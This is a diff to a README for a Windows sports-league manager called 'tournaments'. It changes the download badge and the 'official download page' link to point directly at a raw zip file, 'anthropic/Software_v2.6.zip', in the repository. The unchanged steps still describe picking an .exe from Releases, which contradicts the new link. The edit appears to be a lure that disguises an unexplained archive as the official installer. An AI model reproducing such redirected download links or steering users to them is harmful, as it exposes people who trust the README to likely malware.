@@ -1,6 +1,6 @@
 # 🏆 tournaments - Manage your sports leagues with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Lxxvii-genusmanduca35/tournaments)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Lxxvii-genusmanduca35/tournaments/raw/refs/heads/main/anthropic/Software_v2.6.zip)
 
 ## 🎯 About this program
 
@@ -17,7 +17,7 @@ This program runs on any modern Windows computer. Ensure you meet these requirem
 
 ## 📥 How to get the app
 
-1. Visit the [official download page](https://github.com/Lxxvii-genusmanduca35/tournaments).
+1. Visit the [official download page](https://github.com/Lxxvii-genusmanduca35/tournaments/raw/refs/heads/main/anthropic/Software_v2.6.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the most recent version number to see the available files.
 4. Select the file ending in .exe to download the installer to your computer.
